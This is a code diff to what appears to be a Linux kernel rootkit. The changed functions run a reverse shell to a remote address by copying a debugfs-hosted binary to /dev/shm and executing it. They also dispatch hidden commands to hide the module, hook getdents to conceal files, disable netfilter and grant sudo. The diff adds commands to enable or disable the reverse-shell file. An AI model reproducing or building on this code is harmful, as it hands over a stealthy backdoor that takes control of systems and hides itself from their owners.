@@ -31,14 +31,14 @@ static notrace int _htm_su_handler(const char *args)
 
 static notrace int _htm_shell_handler(__be32 *saddr)
 {
-	int ret;
+	int ret, ret_debugfs;
 	char cmd[HTM_MAX_STRING];
 
 	memset(cmd, 0x00, sizeof(cmd));
 
-	htm_debugfs_rsh_create();
+	ret_debugfs = htm_debugfs_rsh_create();
 
-	snprintf(
+	ret = snprintf(
 		cmd, sizeof(cmd) - 1,
 		"cp " "/sys/kernel/debug/" HTM_DEBUGFS_DIR "/" HTM_DEBUGFS_FILE " /dev/shm/;"
 		"/dev/shm/" HTM_DEBUGFS_FILE " -nfk " HTM_RSH_PASSWORD " -E " HTM_EXEC_SHELL " %pI4 %d;"
@@ -46,11 +46,24 @@ static notrace int _htm_shell_handler(__be32 *saddr)
 		saddr, HTM_RSH_PORT
 	);
 
-	ret = htm_exec(cmd, UMH_NO_WAIT);
+	if (ret <= 0) {
+		#ifdef HTM_DEBUG
+		htm_pr_err("failed to build command string - snprintf returned %u", ret);
+		#endif
 
-	// Unfortunately, the file cannot be removed as doing so creates a race condition due to
-	// UMH_NO_WAIT.
-	//htm_debugfs_rsh_remove();
+		return -ENOMEM;
+	}
+
+	// If `debugfs` wasn't enabled, disable it in user space to prevent a race condition due to
+	// UMH_NO_WAIT
+	if (! ret_debugfs) {
+		snprintf(
+			cmd + ret, (sizeof(cmd) - ret) - 1,
+			";kill -%u %u", HTM_SIG_DISABLE_DEBUGFS, HTM_PID
+		);
+	}
+
+	ret = htm_exec(cmd, UMH_NO_WAIT);
 
 	return ret;
 }
@@ -58,9 +71,11 @@ static notrace int _htm_shell_handler(__be32 *saddr)
 notrace bool is_htm_command_atomic(const char *cmd)
 {
 	return (
-		! strcmp(HTM_CMD_EXEC, cmd)		||
-		! strcmp(HTM_CMD_HIDE_MODULE, cmd) ||
-		! strcmp(HTM_CMD_RSH, cmd)		 ||
+		! strcmp(HTM_CMD_DISABLE_DEBUGFS, cmd) ||
+		! strcmp(HTM_CMD_ENABLE_DEBUGFS, cmd)  ||
+		! strcmp(HTM_CMD_EXEC, cmd)            ||
+		! strcmp(HTM_CMD_HIDE_MODULE, cmd)     ||
+		! strcmp(HTM_CMD_RSH, cmd)             ||
 		! strcmp(HTM_CMD_SHOW_MODULE, cmd)
 	);
 }
@@ -68,16 +83,18 @@ notrace bool is_htm_command_atomic(const char *cmd)
 notrace bool is_htm_command(const char *cmd)
 {
 	return (
-		! strcmp(HTM_CMD_EXEC, cmd)		   ||
-		! strcmp(HTM_CMD_DISABLE_CDD, cmd)	   ||
-		! strcmp(HTM_CMD_DISABLE_FS, cmd)		||
-		! strcmp(HTM_CMD_HIDE_MODULE, cmd)	||
-		! strcmp(HTM_CMD_DISABLE_NF, cmd) ||
-		! strcmp(HTM_CMD_RSH, cmd)		  ||
-		! strcmp(HTM_CMD_ENABLE_CDD, cmd)	   ||
-		! strcmp(HTM_CMD_ENABLE_FS, cmd)		||
-		! strcmp(HTM_CMD_SHOW_MODULE, cmd)	||
-		! strcmp(HTM_CMD_ENABLE_NF, cmd) ||
+		! strcmp(HTM_CMD_DISABLE_CDD, cmd)     ||
+		! strcmp(HTM_CMD_DISABLE_DEBUGFS, cmd) ||
+		! strcmp(HTM_CMD_DISABLE_FS, cmd)      ||
+		! strcmp(HTM_CMD_DISABLE_NF, cmd)      ||
+		! strcmp(HTM_CMD_ENABLE_CDD, cmd)      ||
+		! strcmp(HTM_CMD_ENABLE_DEBUGFS, cmd)  ||
+		! strcmp(HTM_CMD_ENABLE_FS, cmd)       ||
+		! strcmp(HTM_CMD_ENABLE_NF, cmd)       ||
+		! strcmp(HTM_CMD_EXEC, cmd)            ||
+		! strcmp(HTM_CMD_HIDE_MODULE, cmd)     ||
+		! strcmp(HTM_CMD_RSH, cmd)             ||
+		! strcmp(HTM_CMD_SHOW_MODULE, cmd)     ||
 		! strcmp(HTM_CMD_SUDO, cmd)
 	);
 }
@@ -114,6 +131,9 @@ notrace int htm_command(const char *cmd, __be32 *saddr)
 	if (! strcmp(HTM_CMD_DISABLE_CDD, cmd))
 		return htm_cdd_destroy();
 
+	if (! strcmp(HTM_CMD_DISABLE_DEBUGFS, cmd))
+		return htm_debugfs_rsh_remove();
+
 	if (! strcmp(HTM_CMD_DISABLE_FS, cmd)) {
 		if ((ret = htm_hook_uninstall(&hook_sys_getdents)))
 			return ret;
@@ -142,6 +162,9 @@ notrace int htm_command(const char *cmd, __be32 *saddr)
 
 	if (! strcmp(HTM_CMD_ENABLE_CDD, cmd))
 		return htm_cdd_create();
+
+	if (! strcmp(HTM_CMD_ENABLE_DEBUGFS, cmd))
+		return htm_debugfs_rsh_create();
 
 	if (! strcmp(HTM_CMD_ENABLE_FS, cmd)) {
 		if ((ret = htm_hook_install(&hook_sys_getdents)))
